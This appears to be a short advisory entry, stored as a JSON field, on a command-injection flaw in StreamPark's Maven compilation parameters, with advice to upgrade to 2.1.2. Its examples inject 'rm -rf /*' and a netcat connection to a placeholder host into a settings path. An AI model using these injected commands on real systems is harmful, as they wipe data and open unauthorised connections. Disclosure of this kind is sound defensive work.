      "value": "In streampark, there is a project module that integrates Maven's compilation capability. However, there is no check on the compilation parameters of Maven. allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.\n\nMitigation:\n\nall users\u00a0should upgrade to 2.1.2\n\nExample:\n\n##You can customize the splicing method according to the compilation situation of the project, mvn compilation results use &&, compilation failure use \"||\" or \"&&\":\n\n/usr/share/java/maven-3/conf/settings.xml || rm -rf /*\n\n/usr/share/java/maven-3/conf/settings.xml && nohup nc x.x.x.x 8899 &\n\n"
